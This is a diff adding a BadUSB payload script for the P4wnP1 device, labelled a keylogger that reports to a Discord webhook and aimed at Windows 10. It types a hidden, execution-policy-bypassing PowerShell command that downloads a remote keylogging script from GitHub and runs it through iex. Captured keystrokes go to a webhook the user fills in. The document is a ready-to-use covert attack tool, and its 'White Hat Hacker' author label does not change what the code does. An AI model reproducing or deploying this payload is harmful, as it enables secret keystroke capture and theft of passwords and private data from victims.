@@ -1,0 +1,19 @@
+REM Title: P4wnP1_Keylogger_Discord_Webhook_Payload
+REM Author: White Hat Hacker
+REM Description: This script is designed to be used on the P4wnP1 with a slight adjustment. Replace WEBHOOK_HERE before running. Copy and paste the below and leave line 1 blank.
+REM Target: Windows 10 (Powershell)
+REM Props: Beigeworm
+REM Version: 1.0
+REM Category: BadUSB
+
+// Replace WEBHOOK_HERE before running!
+
+// script setup
+layout("us")
+
+// Open Powershell as Admin
+press("GUI r");
+delay(1000);
+type("powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Keylog-to-DC.ps1 | iex");
+delay(500);
+press("ENTER");
